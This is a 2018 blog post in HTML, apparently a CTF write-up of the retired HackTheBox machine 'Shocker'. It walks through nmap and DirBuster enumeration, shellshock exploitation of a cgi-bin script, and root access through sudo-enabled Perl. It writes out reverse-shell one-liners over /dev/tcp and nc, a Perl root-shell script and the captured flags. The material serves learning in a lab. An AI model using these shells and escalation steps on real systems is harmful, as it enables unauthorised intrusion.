@@ -1,0 +1,404 @@
+
+  
+
+
+
+
+
+
+
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>The Bugs I Find | HackTheBox - Hacking Shocker </title>
+  <meta name="theme-color" content="#222222" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="/assets/js/jquery.min.js"></script>
+  <script src="/assets/js/bootstrap.min.js"></script>
+  <script src="/assets/js/header.js"></script>
+  <script src="/assets/js/toc.js"></script>
+  <link href="/assets/css/bootstrap.min.css" rel="stylesheet">
+  <link href="/assets/css/theme.css" rel="stylesheet">
+  <link href="/assets/css/syntax.css" rel="stylesheet">
+  <link href="/assets/css/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+  <link rel="shortcut icon" type="image/png" href="favicon.png">
+</head>
+
+<body>
+
+  
+
+  
+
+
+ <script type="text/javascript">
+  WebFontConfig = {
+    google: {
+      families: ['Ubuntu::latin']
+    }
+  };
+  (function() {
+    var wf = document.createElement('script');
+    wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
+      '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
+    wf.type = 'text/javascript';
+    wf.async = 'true';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(wf, s);
+  })();
+</script>
+
+  <nav class="navbar navbar-inverse navbar-fixed-top">
+    <div class="container">
+      <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" href="/">The Bugs I Find</a>
+      </div>
+      <div class="collapse navbar-collapse">
+        <ul class="nav navbar-nav">
+          <li><a href="/">/home</a></li>
+          <li><a href="/archive.html">/archive</a></li>
+          <li><a href="/tags.html">/tags</a></li>
+          <li><a href="/about.html">/about</a></li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+    <div class="wrapper">
+      <div class="content">
+        <div class="container container-center">
+          <div class="row">
+            <div class="col-md-8">
+              <div class="article">
+                <div class="well">
+                  <h1><a href="/2018/02/htb-ctf-shocker">HackTheBox - Hacking Shocker</a></h1>
+                  <div class="post-meta">
+                    <div class="post-time">
+                      <i class="fa fa-calendar"></i>
+                      <time>21 Feb 2018</time>
+                    </div>
+                    <ul>
+                      
+                        <li><a href="/tag/hackthebox">hackthebox</a></li>
+                      
+                        <li><a href="/tag/ctf">ctf</a></li>
+                      
+                    </ul>
+                  </div>
+                  <div class="post-content">
+                    <div id="toc" class="toc"></div>
+                    <h3 id="disclaimer"><strong>Disclaimer:</strong></h3>
+<p>As by the ToS of HackTheBox, solutions cannot be posted before the machine is retired, so you won’t be able to use this post as your way into the described machine, since it’ll already be out-of-service.</p>
+
+<h1 id="lets-begin">Let’s begin</h1>
+<p>Shocker was my second machine, also an easy one (by the ratings), but it was tough to get it. Once I was there, it was straighforward getting the flags. It’s IP was 10.10.10.56.</p>
+
+<h2 id="enumerating">Enumerating</h2>
+<blockquote class="filename">
+  <p>On my machine</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"># Nmap 7.60 scan initiated Sun Feb  4 12:12:55 2018 as: nmap -A -O -sC -sS -T4 -o nmap-shocker.txt 10.10.10.56
+Nmap scan report for 10.10.10.56
+Host is up (0.26s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (EdDSA)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=2/4%OT=80%CT=1%CU=37687%PV=Y%DS=2%DC=T%G=Y%TM=5A771517
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS(
+OS:O1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST11
+OS:NW6%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
+OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 25/tcp)
+HOP RTT       ADDRESS
+1   273.99 ms 10.10.14.1
+2   272.89 ms 10.10.10.56
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Feb  4 12:13:43 2018 -- 1 IP address (1 host up) scanned in 48.31 seconds</code></pre></figure>
+
+<p>The machine has HTTP and SSH running. No users, no SSH for the moment. I checked HTTP.</p>
+
+<h3 id="http-server">HTTP server</h3>
+<p>Accessing http://10.10.10.56 returned the following page.</p>
+
+<p><img src="/assets/images/shocker/http.png" alt="img" class="center-image" /><em>Page on http://10.10.10.56</em></p>
+
+<p>It meant nothing and the page source code wasn’t interesting. Nevertheless, I still think that the entry point is via web, so I started DirBuster and kept trying to find something.</p>
+
+<p><img src="/assets/images/shocker/dirbuster1.png" alt="img" class="center-image" /><em>DirBuster parameters</em></p>
+
+<p><img src="/assets/images/shocker/dirbuster2.png" alt="img" class="center-image" /><em>DirBuster results</em></p>
+
+<p><strong>Note 1</strong>: Later I noticed that using <code class="highlighter-rouge">DirBuster</code> without changing the default parameters was a mistake.</p>
+
+<p>After some time <code class="highlighter-rouge">DirBuster</code> finished running without results. I went back and changed the <strong>wordlist</strong> used. I selected one that was way larger and the <strong>Time to Finish</strong> was a few hours. I left it running without hopes and gave up to not checking out the forum. I saw a few answers saying to <strong>think what I was looking for</strong>. Of course I didn’t know at the time, so I kept reading. Some answers started pointing to some dir in the form <code class="highlighter-rouge">xxx-bin</code>. <br />
+Ok, I should look for something on <code class="highlighter-rouge">cgi-bin</code>, but what? I knew that <code class="highlighter-rouge">cgi-bin</code> contents used to be <strong>perl scripts</strong>. I took note and kept reading. Some comments refered to the name of the machine and one asked something like:</p>
+<blockquote>
+  <p>-Should I keep searching for a working shellshock exploit? <br />
+-Yes</p>
+</blockquote>
+
+<p>Now I know that I should search inside <code class="highlighter-rouge">cgi-bin</code> and the machine has something to do with <code class="highlighter-rouge">shellshock</code>. Let’s return to <code class="highlighter-rouge">DirBuster</code>.<br />
+For the sake of conservativeness, I set <code class="highlighter-rouge">sh,pl</code> on the <em>File extension</em> field.</p>
+
+<p><img src="/assets/images/shocker/dirbuster3.png" alt="img" class="center-image" /><em>DirBuster parameters used on the successful run</em></p>
+
+<p><img src="/assets/images/shocker/dirbuster4.png" alt="img" class="center-image" /><em>DirBuster successful results</em></p>
+
+<p><strong>Note 2</strong>: Between the first and successful DirBuster runs, it took about 2 hours.</p>
+
+<p>I was sure that it was the entry point. I <code class="highlighter-rouge">curl</code>‘ed <code class="highlighter-rouge">10.10.10.56/cgi-bin/user.sh</code> and saw this:</p>
+
+<blockquote class="filename">
+  <p>On my machine</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">root@kali:~/ctf/shocker# curl http://10.10.10.56/cgi-bin/user.sh
+Content-Type: text/plain
+
+Just an uptime test script
+
+ 09:45:45 up  1:33,  0 users,  load average: 0.80, 0.59, 0.49</code></pre></figure>
+
+<p>Let’s find a <code class="highlighter-rouge">shellshock</code> exploit. I asked the internet and it returned <a href="https://github.com/pwnGuy/shellshock-shell/">this</a> particular page.</p>
+
+<p>So I downloaded it and ran:</p>
+<blockquote class="filename">
+  <p>On my machine</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">root@kali:~/ctf/shocker# ./shellshock.py -u http://10.10.10.56/cgi-bin/user.sh
+&gt; id
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+&gt; pwd
+/usr/lib/cgi-bin
+&gt; </code></pre></figure>
+
+<p>Finally!</p>
+
+<h2 id="getting-a-decent-shell">Getting a decent shell</h2>
+<p>Before going for the flags, I wanted a better shell. And so I got one.</p>
+
+<blockquote class="filename">
+  <p>On my machine</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">root@kali:~/ctf/shocker# nc -nlvp 1234
+listening on [any] 1234 ...</code></pre></figure>
+
+<blockquote class="filename">
+  <p>On the server</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">&gt; bash -i &gt;&amp; /dev/tcp/10.10.15.101/1234 0&gt;&amp;1</code></pre></figure>
+
+<p>Then I got a shell!</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">root@kali:~/ctf/shocker# nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [10.10.15.101] from (UNKNOWN) [10.10.10.56] 48700
+bash: no job control in this shell
+shelly@Shocker:/usr/lib/cgi-bin$ </code></pre></figure>
+
+<p>But ….. this shell was echoing every key typed. I needed a better shell.</p>
+
+<blockquote class="filename">
+  <p>On my machine</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">root@kali:~/ctf/shocker# nc -nlvp 1235
+listening on [any] 1235 ...</code></pre></figure>
+
+<blockquote class="filename">
+  <p>On the server</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">&gt; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc LISTENING-IP LISTENING-PORT &gt; /tmp/f</code></pre></figure>
+
+<blockquote class="filename">
+  <p>On my machine</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">root@kali:~/ctf/shocker# nc -nlvp 1235
+listening on [any] 1235 ...
+connect to [10.10.15.101] from (UNKNOWN) [10.10.10.56] 35756
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</code></pre></figure>
+
+<p>Now the shell was decent. Flags, here I come!</p>
+
+<h2 id="getting-the-user-flag-it-was-boring">Getting the <code class="highlighter-rouge">user</code> flag (it was boring)</h2>
+<p>To score the first points, I had to find the <code class="highlighter-rouge">user.txt</code> file, where the flag was. I took the direct approach:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
+2ec24e11320026d1e70ff3e16695b233</code></pre></figure>
+
+<p>That was very easy. Let’s step up the game.</p>
+
+<h2 id="getting-the-root-flag-it-was-cool">Getting the <code class="highlighter-rouge">root</code> flag (it was cool)</h2>
+<p>As my first try, ran the obvious <code class="highlighter-rouge">sudo su</code> but it didn’t work because the user’s password was unknown.</p>
+
+<h3 id="linenum">LinEnum</h3>
+<p>So, there is this awesome enumeration script called <code class="highlighter-rouge">LinEnum.sh</code> (that can be found <a href="https://github.com/rebootuser/LinEnum">here</a>). Since the box couldn’t communicate with the outer-world, I had to upload it from my machine and I chose <code class="highlighter-rouge">nc</code> to do that.</p>
+
+<blockquote class="filename">
+  <p>On my machine</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">root@kali:~/ctf/shocker# nc -nlvp 1233 &lt; LinEnum.sh 
+listening on [any] 1233 ...</code></pre></figure>
+
+<blockquote class="filename">
+  <p>On the server</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">shelly@Shocker:/usr/lib/cgi-bin$ cd /tmp
+shelly@Shocker:/tmp$ nc 10.10.15.101 1233 &gt; enum.sh
+shelly@Shocker:/tmp$ sh enum.sh -t -r shocker</code></pre></figure>
+
+<p>The produced report was named <code class="highlighter-rouge">shocker-04-02-18</code> and I downloaded it via <code class="highlighter-rouge">nc</code> (that I’ll suppress).<br />
+Upon reading it, I saw that <code class="highlighter-rouge">/bin/perl</code> could be ran as <code class="highlighter-rouge">root</code>. At this point, I noticed that I was very close. I could just write a script to print the <code class="highlighter-rouge">root</code> flag but that would be pretty boring, right? I’d rather get a <code class="highlighter-rouge">root</code> shell just for fun! And so I came up with this simple script:</p>
+
+<blockquote class="filename">
+  <p>root.pl</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">#!/bin/perl
+system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.101 1233 &gt;/tmp/f");</code></pre></figure>
+
+<p>And proceeded to get the desired shell:</p>
+<blockquote class="filename">
+  <p>On my machine</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">root@kali:~/ctf/shocker# nc -nlvp 1233
+listening on [any] 1233 ...</code></pre></figure>
+
+<blockquote class="filename">
+  <p>On the server</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">shelly@Shocker:/tmp$ sudo /usr/bin/perl root.pl</code></pre></figure>
+
+<p>And finally I was (g)<code class="highlighter-rouge">root</code>!</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">root@kali:~/ctf/shocker# nc -nlvp 1233
+listening on [any] 1233 ...
+connect to [10.10.15.101] from (UNKNOWN) [10.10.10.56] 40344
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre></figure>
+
+<p>Alright, the <code class="highlighter-rouge">root</code> flag …</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"># cat /root/root.txt
+52c2715605d70c7619030560dc1ca467</code></pre></figure>
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>It was hard for me to find the entry point, but after that, it was pretty simple. I noticed that sometimes I overcomplicate stuff e.g. I think I could have just set up a perl script with <code class="highlighter-rouge">system("bash")</code> and get <code class="highlighter-rouge">root</code> in the fraction of the time, but I only thought about that hours after. I feel that I lack some enumeration skills and mindset, but that is the purpose of me working on these boxes.</p>
+
+<p>exit(0);</p>
+
+                    
+
+                  </div>
+                  
+                </div>
+              </div>
+            </div>
+            <div class="col-md-4 hidden-xs">
+              <div class="sidebar ">
+  <h2>Recent Posts</h2>
+  <ul>
+    
+    <li><a href="/2018/02/htb-ctf-shocker">HackTheBox - Hacking Shocker</a></li>
+    
+    <li><a href="/2018/02/htb-ctf-mirai">HackTheBox - Hacking Mirai</a></li>
+    
+    <li><a href="/2018/02/hello-world">Hello World</a></li>
+    
+  </ul>
+</div>
+
+<div class="sidebar">
+  <h2>Tags</h2>
+  <ul class="sideBarTags">
+    
+    
+    <li>
+      <a href="/tag/ctf" data-toggle="tooltip" data-placement="right" title="2">
+        <span>ctf</span></a></li>
+    
+    <li>
+      <a href="/tag/hackthebox" data-toggle="tooltip" data-placement="right" title="2">
+        <span>hackthebox</span></a></li>
+    
+  </ul>
+</div>
+
+            </div>
+          </div>
+        </div>
+        
+
+      </div>
+          <footer class="footer-distributed">
+      <div class="container">
+        <div class="footer">
+          <p>Luiz Felipe Zafra Saggioro &copy; 2018</p>
+	  <p>Powered by Jekyll - Theme 'Jekyll Clean Dark'</p>
+          <h6>Follow me</h6>
+
+<ul class="social-media">
+
+  
+    <li>
+      <a title="luizfzs on Github" href="https://github.com/luizfzs" target="_blank"><i class="fa fa-github fa-2x"></i></a>
+    </li>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</ul>
+
+        </div>
+      </div>
+    </footer>
+
+    </div>
+  </body>
+</html>
